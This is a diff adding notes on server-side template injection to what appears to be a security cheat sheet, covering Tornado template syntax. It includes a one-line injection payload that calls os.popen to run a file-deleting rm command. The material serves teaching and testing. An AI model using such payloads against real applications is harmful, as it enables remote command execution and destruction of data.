@@ -4071,6 +4071,44 @@ from -e:4:in `<main>'
 
 --------------
 
+### Reference
+
+--------------
+
+- [HDKS](https://exploit-notes.hdks.org/exploit/web/security-risk/erb-ssti/)
+  
+--------------
+
+### SSTI in Tornado[Code Context]
+
+-------------
+
+- Tornado template syntax according to the documentation, Syntax is `{{}}`
+
+```python
+t = template.Template("<html>{{ myvalue }}</html>")
+print(t.generate(myvalue="XXX"))
+```
+- Tornado is so interesting that we can execute python directly within the tags. You can call `__import__` straightup and pick up your desired module.
+
+```
+{{__import__('os').popen('rm+morale.txt').read()}}
+```
+
+-----------
+
+### Reference-:
+
+------------
+
+- [Tornado's template docs](https://www.tornadoweb.org/en/stable/template.html)
+
+------------
+
+
+
+
+
 
 
 
